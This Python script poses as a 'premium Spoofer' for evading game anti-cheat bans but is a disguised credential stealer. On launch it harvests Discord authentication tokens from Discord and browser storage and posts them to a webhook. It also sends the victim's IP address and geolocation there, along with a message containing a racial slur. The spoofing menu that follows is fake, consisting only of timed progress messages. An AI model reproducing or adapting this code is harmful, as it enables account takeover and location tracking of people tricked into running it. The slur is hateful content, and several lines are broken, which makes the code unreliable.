import os
import time
import ctypes
import getpass
import colorama
import requests
from colorama import Fore, init, Style
import random
from tkinter import messagebox
import tkinter as tk
import json
from dhooks import Webhook, Embed
from datetime import datetime
from urllib.request import Request, urlopen
import re
import discord
import asyncio
from urllib.request import urlopen
import dhook

logs = "WEBHOOK"

WEBHOOK_URL = "WEBHOOK"
PING_ME = True

def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

def main():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    message = '@everyone' if PING_ME else ''

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += f'\n**{platform}**\n```\n'

        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}\n'
        else:
            message += 'No tokens found.\n'

        message += '```'

    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }

    payload = json.dumps({'content': message})

    try:
        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
        urlopen(req)
    except:
        pass

if __name__ == '__main__':
    main()





















hook = Webhook("WEBHOOK")





ip = requests.get('https://api.ipify.org/').text

r = requests.get(f'http://extreme-ip-lookup.com/json/{ip})

geo = r.json()
embed = Embed()
fields = [
    {'name': 'IP', 'value': geo['query']},
    {'name': 'ipType', 'value': geo['ipType']},
    {'name': 'City', 'value': geo['city']},
    {'name': 'Continent', 'value': geo['continent']},
    {'name': 'Country', 'value': geo['country']},
    {'name': 'IPName', 'value': geo['ipName']},
    {'name': 'ISP', 'value': geo['isp']},
    {'name': 'Latitute', 'value': geo['lat']},
    {'name': 'Longitude', 'value': geo['lon']},
    {'name': 'Org', 'value': geo['org']},
    {'name': 'Region', 'value': geo['region']},


]
for field in fields:
    if field['value']:
        embed.add_field(name=field['name'], value=field['value'], inline=True)


hook.send(embed=embed)



data = {"content": "grabbed a nigger at : " + time.strftime("%d/%m/%Y %H:%M:%S     ")}
response = requests.post(logs, json=data)





userpc = getpass.getuser()

colorama.init(autoreset=True)

os.system('cls')
ctypes.windll.kernel32.SetConsoleTitleW('premium Spoofer                                                                        ' + time.strftime("%d/%m/%Y %H:%M:%S     ") + 'Loading.')
time.sleep(0.5)
ctypes.windll.kernel32.SetConsoleTitleW('premium Spoofer                                                                        ' + time.strftime("%d/%m/%Y %H:%M:%S     ") + 'Loading..')
time.sleep(0.5)
ctypes.windll.kernel32.SetConsoleTitleW('premium Spoofer                                                                        ' + time.strftime("%d/%m/%Y %H:%M:%S     ") + 'Loading...')
time.sleep(0.5)
ctypes.windll.kernel32.SetConsoleTitleW('premium Spoofer                                                                        ' + time.strftime("%d/%m/%Y %H:%M:%S     ") + 'Loading.')
time.sleep(0.5)
ctypes.windll.kernel32.SetConsoleTitleW('premium Spoofer                                                                        ' + time.strftime("%d/%m/%Y %H:%M:%S     ") + 'Loading..')
time.sleep(0.5)
ctypes.windll.kernel32.SetConsoleTitleW('premium Spoofer                                                                        ' + time.strftime("%d/%m/%Y %H:%M:%S     ") + 'Loading...')
time.sleep(0.45)
ctypes.windll.kernel32.SetConsoleTitleW('premium Spoofer                                                                        ' + time.strftime("%d/%m/%Y %H:%M:%S     ") + 'Loading.')
time.sleep(0.4)
ctypes.windll.kernel32.SetConsoleTitleW('premium Spoofer                                                                        ' + time.strftime("%d/%m/%Y %H:%M:%S     ") + 'Loading..')
time.sleep(0.3)
ctypes.windll.kernel32.SetConsoleTitleW('premium Spoofer                                                                        ' + time.strftime("%d/%m/%Y %H:%M:%S     ") + 'Loading...')
time.sleep(0.25)
ctypes.windll.kernel32.SetConsoleTitleW('premium Spoofer                                                                        ' + time.strftime("%d/%m/%Y %H:%M     ") + 'Loading.')
time.sleep(0.5)

os.system("cls")
print()
print("         [" + Fore.BLUE + time.strftime("%d/%m/%Y %H:%M") + Fore.RESET  + "]" + " : Login")
time.sleep(1)
username = input("         [" + Fore.BLUE + time.strftime("%d/%m/%Y %H:%M") + Fore.RESET  + "]" + " : Username:")
time.sleep(1)
if username == "admin":
    os.system("cls")
    print("         [" + Fore.BLUE + time.strftime("%d/%m/%Y %H:%M:%S") + Fore.RESET + "]" "Succesfully saved Username!")
    print("         [" + Fore.BLUE + time.strftime("%d/%m/%Y %H:%M:%S") + Fore.RESET + "]" "Username : "+ username)
    password = input("         [" + Fore.BLUE + time.strftime("%d/%m/%Y %H:%M:%S") + Fore.RESET + "]" + "Password:")


    if password == "admin":
        os.system('cls')
        print()
        print("         [" + Fore.BLUE + time.strftime("%d/%m/%Y %H:%M:%S") + Fore.RESET + "]" + " : Logging in.")
        time.sleep(0.5)
        os.system("cls")
        print("         [" + Fore.BLUE + time.strftime("%d/%m/%Y %H:%M:%S") + Fore.RESET + "]" + " : Logging in..")
        time.sleep(0.5)
        os.system("cls")
        print("         [" + Fore.BLUE + time.strftime("%d/%m/%Y %H:%M:%S") + Fore.RESET + "]" + " : Logging in...")
        os.system("cls")
        print("Succesfully logged in!")
        os.system('cls')
        print("         [" + Fore.BLUE + time.strftime("%d/%m/%Y %H:%M:%S") + Fore.RESET + "]" + " : Auto Login? (Y/N)")
        AutoLogin = input("         ")
        if AutoLogin == "Y" or "y":
            os.system("cls")
            print()
            ctypes.windll.kernel32.SetConsoleTitleW('         premium spoofer       ' + 'Welcome ' + username + "               " + time.strftime("%d/%m/%Y %H:%M"))
            print("         [" + Fore.BLUE + time.strftime(
                "%d/%m/%Y %H:%M:%S") + Fore.RESET + "]" + " : Logged in as " + username)
            time.sleep(1)
            print()
            time.sleep(1)
            print("         [" + Fore.BLUE + time.strftime(
                "%d/%m/%Y %H:%M:%S") + Fore.RESET + "]" + " : Establishing connection to the server!")
            time.sleep(5 or 4 or 6)
            print("         [" + Fore.BLUE + time.strftime(
                "%d/%m/%Y %H:%M:%S") + Fore.RESET + "]" + " : Connected to the server!")
            time.sleep(1)
            os.system("cls")
            print()
            print("         " + Fore.BLUE + "[" + Fore.RESET + "1" + Fore.BLUE + "]" + Fore.RESET + " HWID Changer")
            print("         " + Fore.BLUE + "[" + Fore.RESET + "2" + Fore.BLUE + "]" + Fore.RESET + " Battleye Spoof")
            print("         " + Fore.BLUE + "[" + Fore.RESET + "3" + Fore.BLUE + "]" + Fore.RESET + " EasyAnticheat Spoof")
            print("         " + Fore.BLUE + "[" + Fore.RESET + "4" + Fore.BLUE + "]" + Fore.RESET + " Vanguard [BETA] Spoof")
            print("         " + Fore.BLUE + "[" + Fore.RESET + "5" + Fore.BLUE + "]" + Fore.RESET + " FaceIT [BETA] Spoof")
            print("         " + Fore.BLUE + "[" + Fore.RESET + "6" + Fore.BLUE + "]" + Fore.RESET + " FiveM [BETA] Spoof")
            print("         " + Fore.BLUE + "[" + Fore.RESET + "7" + Fore.BLUE + "]" + Fore.RESET + " EQU8 Spoof")
            print("         " + Fore.BLUE + "[" + Fore.RESET + "0" + Fore.BLUE + "]" + Fore.RESET + " Close")
            print("All our Spoofing Methods are on our Discord Server!")

            Select = input("          ")
            if Select == 0:
                exit()
            else:
                if Select == 1 or 2 or 3 or 4 or 5 or 6 or 7:
                    time.sleep(1)
                    print("Starting to spoof in 3")
                    time.sleep(1)
                    os.system("cls")
                    print("2")
                    time.sleep(1)
                    os.system("cls")
                    print("1")
                    time.sleep(1)
                    os.system("cls")
                    print("Spoofing your Diskdrive")
                    time.sleep(3)
                    print("Spoofing your Memorychip")
                    time.sleep(3.6)
                    print("Spoofing your Baseboard")
                    time.sleep(4.1)
                    print("Spoofing your SMBIOS")
                    time.sleep(2.3)
                    print("Spoofing your CPU")
                    time.sleep(5)
                    print("Spoofing your peripherals(Keyboard,Mouse,Monitor and more!)")
                    time.sleep(7.5)
                    print("Spoofing your VolumeIDS")
                    time.sleep(4)
                    print("Spoofing your Registry Informations")
                    time.sleep(13)
                    print("Spoofing your Usermode identifiers")
                    time.sleep(9.5)
                    print("Spoofing your EDIDs")
                    time.sleep(4)
                    print("Spoofing your NICs + arp")
                    time.sleep(3)
                    print("Spoofing your USB serials")
                    time.sleep(2)
                    print("Spoofing your GPU")
                    time.sleep(16.3)
                    print("Sucessfully spoofed,closing in 3 seconds...")
                    time.sleep(3)
                    os.system('cls')
                    print("         [" + Fore.BLUE + time.strftime(
                        "%d/%m/%Y %H:%M:%S") + Fore.RESET + "]" + " : Start Cleaning? (Y/N)")
                    Cleaning = input("         ")
                    if Cleaning == "Y" or "y":
                        print("Starting cleaning in 3")
                        time.sleep(1)
                        os.system("cls")
                        print("Starting cleaning in 2")
                        os.system("cls")
                        time.sleep(1)
                        print("Starting cleaning in 1")
                        root = tk.Tk()
                        root.withdraw()
                        time.sleep(1)
                        messagebox.showinfo("Informations", "Starting to spoof now!")
                        os.sleep(0.5)
                        os.system("cls")
                        time.sleep(1)
                        print("Cleaning.")
                        time.sleep(1)
                        os.system("cls")
                        print("Cleaning..")
                        time.sleep(1)
                        os.system("cls")
                        print("Cleaning...")
                        time.sleep(1)
                        os.system("cls")
                        print("Cleaning.")
                        time.sleep(1)
                        os.system("cls")
                        print("Cleaning..")
                        time.sleep(1)
                        os.system("cls")
                        print("Cleaning..")
                        time.sleep(1)
                        os.system("cls")
                        print("Cleaning...")
                        time.sleep(1)
                        os.system("cls")
                        print("Cleaning.")
                        time.sleep(1)
                        os.system("cls")
                        print("Cleaning..")
                        time.sleep(1)
                        os.system("cls")
                        print("Cleaning...")
                        time.sleep(1)
                        os.system("cls")
                        print("Cleaning.")
                        time.sleep(1)
                        os.system("cls")
                        print("Cleaning..")
                        os.system("cls")
                        time.sleep(1)
                        root = tk.Tk()
                        root.withdraw()
                        time.sleep(1)
                        messagebox.showinfo("Informations", "Cleaning finished!")
                        root = tk.Tk()
                        root.withdraw()
                        time.sleep(1)
                        messagebox.showinfo("Informations", "Succesfully Spoofed + Cleaned!", "Closing in 5 Seconds")
                        os.sleep(5)
                        exit()






                else:
                    print("         [" + Fore.BLUE + time.strftime(
                        "%d/%m/%Y %H:%M:%S") + Fore.RESET + "]" + " : Error, Restart")
        else:
            if AutoLogin == "N" or "n":
                print("         [" + Fore.BLUE + time.strftime(
                    "%d/%m/%Y %H:%M:%S") + Fore.RESET + "]" + " : Error, Restart")
            else:
                print("         [" + Fore.BLUE + time.strftime(
                    "%d/%m/%Y %H:%M:%S") + Fore.RESET + "]" + " : Error, Restart")













